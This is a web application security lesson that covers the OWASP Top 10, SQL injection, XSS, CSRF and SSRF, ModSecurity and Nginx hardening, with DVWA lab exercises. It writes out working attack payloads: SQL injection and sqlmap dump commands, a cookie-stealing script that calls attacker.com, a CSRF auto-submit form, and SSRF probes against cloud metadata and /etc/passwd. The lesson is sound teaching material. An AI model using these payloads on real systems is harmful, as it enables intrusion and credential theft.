# Lesson 24: Web Application Security

> **Security Advanced · Lesson 24** | Difficulty: ★★★★☆ Advanced | Time: ~150 min

---

## Learning Objectives

By the end of this lesson you will be able to:

- Explain and demonstrate the OWASP Top 10 vulnerability classes
- Manually test for SQL Injection, XSS, and CSRF vulnerabilities
- Deploy and configure ModSecurity as a Web Application Firewall (WAF)
- Harden an Nginx web server against common attacks
- Use Burp Suite and command-line tools for web application testing

---

## Prerequisites

- Lesson 23 (Firewall and Network Security) or equivalent
- Basic knowledge of HTTP, HTML, and SQL
- A test web application environment (DVWA or similar recommended)
- `curl`, `sqlmap`, and `nikto` installed

---

## Key Concepts

### 1. OWASP Top 10 (2021 Edition)

The Open Web Application Security Project (OWASP) maintains the most widely referenced list of web security risks.

| Rank | Category | Key Risk |
|------|----------|----------|
| A01 | Broken Access Control | Horizontal/vertical privilege escalation |
| A02 | Cryptographic Failures | Weak ciphers, data in transit/rest exposure |
| A03 | Injection | SQL, NoSQL, OS, LDAP injection |
| A04 | Insecure Design | Missing threat modelling, design flaws |
| A05 | Security Misconfiguration | Default credentials, verbose errors, open cloud storage |
| A06 | Vulnerable Components | Outdated libraries with known CVEs |
| A07 | Auth Failures | Weak passwords, missing MFA, session fixation |
| A08 | Software/Data Integrity Failures | Insecure deserialization, CI/CD tampering |
| A09 | Logging/Monitoring Failures | No audit logs, slow breach detection |
| A10 | SSRF | Server-side request forgery to internal services |

### 2. SQL Injection (SQLi)

SQLi occurs when user input is concatenated directly into SQL queries without sanitisation.

**Types**:
- **In-band** – error-based or UNION-based; results returned in the response
- **Blind boolean** – infer data from true/false responses
- **Blind time-based** – infer data from response delays
- **Out-of-band** – exfiltrate via DNS/HTTP callbacks (requires specific DB features)

```bash
# Manual testing – basic detection
curl -s "http://target/item?id=1'"          # Should cause DB error
curl -s "http://target/item?id=1 OR 1=1"   # Should return all rows
curl -s "http://target/item?id=1 AND 1=2"  # Should return nothing

# UNION-based injection to enumerate columns
curl -s "http://target/item?id=1 ORDER BY 1--"
curl -s "http://target/item?id=1 ORDER BY 5--"  # Increase until error

# Determine column count and find injectable column
curl -s "http://target/item?id=-1 UNION SELECT NULL,NULL,NULL--"

# Extract database version (MySQL/MariaDB)
curl -s "http://target/item?id=-1 UNION SELECT 1,@@version,3--"

# Extract table names from information_schema
curl -s "http://target/item?id=-1 UNION SELECT 1,table_name,3 \
  FROM information_schema.tables WHERE table_schema=database()--"
```

**Automated SQLi with sqlmap**:

```bash
# Basic detection and exploitation
sqlmap -u "http://target/item?id=1" --batch

# Extract all databases
sqlmap -u "http://target/item?id=1" --dbs --batch

# Dump a specific table
sqlmap -u "http://target/item?id=1" -D mydb -T users --dump --batch

# Test POST parameter
sqlmap -u "http://target/login" --data="username=admin&password=test" \
  -p username --batch

# Use a saved HTTP request (from Burp)
sqlmap -r request.txt --level=5 --risk=3 --batch

# Time-based blind injection (slower but works when no output)
sqlmap -u "http://target/item?id=1" --technique=T --batch
```

**Prevention**:

```python
# VULNERABLE – string concatenation
query = "SELECT * FROM users WHERE id = " + user_input

# SAFE – parameterised query (Python example)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))

# SAFE – stored procedure
cursor.callproc("get_user_by_id", [user_input])
```

### 3. Cross-Site Scripting (XSS)

XSS allows attackers to inject client-side scripts into web pages viewed by other users.

**Types**:
- **Reflected** – payload in request, reflected in response (one victim at a time)
- **Stored** – payload persisted in the database (affects all users who view the page)
- **DOM-based** – payload executed by client-side JavaScript without touching the server

```bash
# Basic detection
curl -s "http://target/search?q=<script>alert(1)</script>" | grep -i "<script>"

# Polyglot XSS payload (tests multiple contexts)
# jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</style></title></textarea></script>

# Reflected XSS via URL parameter
curl -s "http://target/page?name=<img src=x onerror=alert(document.cookie)>"

# Cookie theft payload (for PoC – replace with your server)
# <script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
```

**Testing with browser DevTools**:

```javascript
// Check if input is reflected without encoding
// Paste in URL: http://target/search?q=XSS_TEST_123
// Then in browser console:
document.body.innerHTML.indexOf('XSS_TEST_123')
```

**Prevention**:

```javascript
// VULNERABLE – direct innerHTML assignment
element.innerHTML = userInput;

// SAFE – use textContent (auto-escapes)
element.textContent = userInput;

// SAFE – DOMPurify library for rich HTML
element.innerHTML = DOMPurify.sanitize(userInput);
```

```python
# SAFE – Jinja2 auto-escaping (default)
# {{ user_input }}  ← HTML-escaped automatically
# Use |safe only when you have sanitised the content yourself
```

### 4. Cross-Site Request Forgery (CSRF)

CSRF tricks authenticated users into submitting unintended requests.

```html
<!-- Attacker's page that auto-submits a form to the bank -->
<form action="https://bank.example.com/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

```bash
# Test CSRF: check if anti-CSRF tokens are present
curl -c cookies.txt -b cookies.txt -s http://target/profile \
  | grep -i "csrf\|_token\|nonce"

# Attempt a state-changing request without a CSRF token
curl -b cookies.txt -X POST http://target/change-email \
  -d "email=attacker@evil.com" -v 2>&1 | grep "HTTP/"
```

**Prevention**:
- **Synchroniser Token Pattern** – unique per-session or per-form token validated server-side
- **Double Submit Cookie** – match token in cookie vs. request body
- **SameSite cookie attribute** – `SameSite=Lax` or `SameSite=Strict`
- **Custom request headers** – AJAX requests with `X-Requested-With` are blocked cross-origin

### 5. Server-Side Request Forgery (SSRF)

SSRF allows attackers to make the server fetch internal resources.

```bash
# Basic SSRF detection
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"  # AWS IMDS
curl "http://target/fetch?url=http://localhost:6379/INFO"                  # Redis
curl "http://target/fetch?url=file:///etc/passwd"                         # File read

# SSRF bypass techniques
# Using redirects
curl "http://target/fetch?url=http://attacker.com/redirect_to_169"

# Using DNS rebinding (advanced)
# Using different encodings
curl "http://target/fetch?url=http://0177.0.0.1/"                         # Octal
curl "http://target/fetch?url=http://2130706433/"                         # Decimal
curl "http://target/fetch?url=http://[::1]/"                              # IPv6
```

### 6. ModSecurity WAF

ModSecurity is an open-source WAF module for Apache and Nginx.

```bash
# Install ModSecurity for Nginx
sudo apt install -y libmodsecurity3 nginx libnginx-mod-security
# or compile from source for latest version:
# git clone https://github.com/SpiderLabs/ModSecurity
# cd ModSecurity && ./build.sh && ./configure && make && sudo make install

# Download OWASP Core Rule Set (CRS)
sudo git clone https://github.com/coreruleset/coreruleset \
  /etc/nginx/modsecurity-crs
sudo cp /etc/nginx/modsecurity-crs/crs-setup.conf.example \
  /etc/nginx/modsecurity-crs/crs-setup.conf
```

**ModSecurity configuration** (`/etc/nginx/modsecurity.conf`):

```
# Enable ModSecurity
SecRuleEngine On    # DetectionOnly for testing, On for blocking

# Request body inspection
SecRequestBodyAccess On
SecRequestBodyLimit 13107200
SecRequestBodyNoFilesLimit 131072

# Response body inspection
SecResponseBodyAccess On
SecResponseBodyLimit 524288

# Default action
SecDefaultAction "phase:2,deny,status:403,log"

# Include OWASP CRS
Include /etc/nginx/modsecurity-crs/crs-setup.conf
Include /etc/nginx/modsecurity-crs/rules/*.conf

# Custom rule – block SQLi patterns
SecRule ARGS "@detectSQLi" \
  "id:1001,phase:2,block,log,msg:'SQLi Attempt'"

# Custom rule – block path traversal
SecRule REQUEST_URI "@contains ../" \
  "id:1002,phase:1,block,log,msg:'Path Traversal Attempt'"

# Whitelist a legitimate rule triggering false positive
SecRuleRemoveById 942100
```

```nginx
# nginx.conf – load ModSecurity
load_module modules/ngx_http_modsecurity_module.so;

http {
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsecurity.conf;

    server {
        listen 443 ssl;
        # ... rest of config
    }
}
```

### 7. Nginx Hardening

```nginx
# /etc/nginx/nginx.conf – hardened configuration

user www-data;
worker_processes auto;

http {
    # Hide version number
    server_tokens off;

    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Content-Security-Policy
        "default-src 'self'; script-src 'self'; style-src 'self'" always;
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
    add_header Strict-Transport-Security
        "max-age=31536000; includeSubDomains; preload" always;

    # Prevent clickjacking
    add_header X-Frame-Options DENY;

    # Disable unnecessary HTTP methods
    server {
        if ($request_method !~ ^(GET|HEAD|POST|PUT|DELETE|PATCH)$) {
            return 405;
        }

        # Block access to hidden files
        location ~ /\. {
            deny all;
            return 404;
        }

        # Block access to backup files
        location ~* \.(bak|conf|dist|fla|inc|ini|log|psd|sh|sql|swp)$ {
            deny all;
            return 404;
        }

        # Rate limiting
        limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
        location /api/ {
            limit_req zone=api burst=20 nodelay;
        }

        # SSL hardening
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
        ssl_prefer_server_ciphers on;
        ssl_session_cache shared:SSL:10m;
        ssl_session_timeout 1d;
        ssl_session_tickets off;
        ssl_stapling on;
        ssl_stapling_verify on;
    }
}
```

```bash
# Test Nginx configuration
sudo nginx -t

# Check security headers
curl -I https://yourdomain.com

# Run a quick web vulnerability scan
nikto -h http://target -output nikto_report.txt

# Check SSL/TLS configuration
testssl.sh https://yourdomain.com
```

---

## Practical Exercises

### Exercise 1 – Manual SQLi Testing

```bash
# Set up a local vulnerable test (requires Docker)
docker run -d -p 8080:80 --name dvwa vulnerables/web-dvwa
# Access http://localhost:8080, default credentials: admin/password
# Set DVWA Security to "Low"

# Test login bypass
curl -s -c cookies.txt http://localhost:8080/login.php \
  -d "username=admin'--&password=anything&Login=Login" -L | grep -i "welcome\|logout"

# Test GET parameter injection
curl -s -b cookies.txt \
  "http://localhost:8080/vulnerabilities/sqli/?id=1' ORDER BY 1--+&Submit=Submit"
```

### Exercise 2 – XSS Cookie Theft Demo

```bash
# Start a simple HTTP server to capture cookies
python3 -m http.server 9999 &
SERVER_PID=$!

# Craft XSS payload (URL-encoded)
PAYLOAD='<script>fetch("http://127.0.0.1:9999/?c="+document.cookie)</script>'
echo "XSS Payload: $PAYLOAD"

# Inject into a vulnerable parameter (simulated with curl)
curl -s "http://localhost:8080/vulnerabilities/xss_r/?name=$(python3 -c \
  'import urllib.parse; print(urllib.parse.quote("<script>alert(1)</script>)")')"

kill $SERVER_PID 2>/dev/null
```

### Exercise 3 – Nikto Web Vulnerability Scanner

```bash
# Run Nikto against a local test server
nikto -h http://localhost:8080 -Tuning 1234567890 -output nikto.txt
cat nikto.txt

# Scan HTTPS target, ignoring cert errors
nikto -h https://localhost:8443 -ssl -nointeractive

# Check for specific vulnerability categories
nikto -h http://localhost:8080 -Tuning b  # Software identification only
```

### Exercise 4 – ModSecurity in Detection Mode

```bash
# Check ModSecurity audit log after sending attack payload
curl "http://localhost/?id=1' UNION SELECT 1,2,3--"
sudo tail -50 /var/log/modsecurity/audit.log | grep -A5 "SQLi\|UNION\|injection" || \
  echo "Check /var/log/nginx/error.log for ModSecurity messages"
```

---

## Common Pitfalls

| Pitfall | Impact | Fix |
|---------|--------|-----|
| Testing against production | May trigger WAF, alert team, cause legal issues | Always use dedicated test environments |
| Confusing XSS types | Missing stored XSS which has broader impact | Map each injection point to reflected vs stored |
| Relying only on client-side validation | Trivially bypassed with Burp/curl | Always validate and sanitise server-side |
| ModSecurity in blocking mode immediately | High false-positive rate breaks the app | Start in `DetectionOnly`, tune, then switch to `On` |
| Ignoring second-order SQLi | Payload stored safely but executed unsafely later | Test all stored data that gets used in queries |
| Missing CSRF on API endpoints | Assumed APIs can't be CSRF'd from browser | All state-changing endpoints need CSRF protection |

---

## Summary

- The **OWASP Top 10** frames the most common and impactful web vulnerabilities
- **SQLi** is prevented by parameterised queries; **never** concatenate user input into SQL
- **XSS** is prevented by output encoding and Content Security Policy headers
- **CSRF** is prevented by synchroniser tokens and the `SameSite` cookie attribute
- **ModSecurity + OWASP CRS** provides defence-in-depth at the WAF layer
- **Nginx hardening** — security headers, TLS configuration, rate limiting — reduces attack surface
- Always test in a dedicated environment; use tools like `sqlmap`, `nikto`, and Burp Suite

---

## Further Reading

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [ModSecurity Reference Manual](https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual)
- [OWASP Core Rule Set](https://coreruleset.org/docs/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) – free interactive labs
- *The Web Application Hacker's Handbook* by Stuttard & Pinto
